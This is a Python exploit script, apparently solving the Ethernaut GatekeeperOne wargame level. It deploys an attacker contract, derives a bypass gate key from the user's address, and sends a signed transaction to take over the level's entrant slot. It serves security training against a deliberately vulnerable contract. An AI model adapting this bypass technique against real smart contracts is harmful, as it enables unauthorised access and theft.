from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0xa12fFA0B9f159BB4C54bce579611927Addc51610'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL13_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "function",
        "name": "enter",
        "inputs": [
            {
                "name": "_gateKey",
                "type": "bytes8",
                "internalType": "bytes8"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "signature": "0x3370204e"
    },
    {
        "type": "function",
        "name": "entrant",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x9db31d77"
    }
]

with open("./contract/GatekeeperOneAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

attacker = web3.eth.contract(address=receipt.contractAddress, abi=ATTACKER_ABI)

print("---- BEFORE TRANSACTION ----")
BEFORE_ENTRANT = contract.functions.entrant.call()

print(f"entrant (Before Transaction) : {BEFORE_ENTRANT}\n")

if (USER_ADDRESS == BEFORE_ENTRANT):
    print("Entrant Address already changed!")

_gateKey = (int(USER_ADDRESS, 0) & 0x10000FFFF).to_bytes(8, byteorder="big")

print(f"int(_gateKey) : {hex(int.from_bytes(_gateKey, byteorder="big", signed=False))}\n")

tx = attacker.functions.attack(_gateKey).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

print("---- AFTER TRANSACTION ----")

AFTER_ENTRANT = contract.functions.entrant.call()

print(f"entrant (After Transaction) : {AFTER_ENTRANT}\n")

if (USER_ADDRESS == AFTER_ENTRANT):
    print("Attack Success!")
else:
    print("Attack Failed...")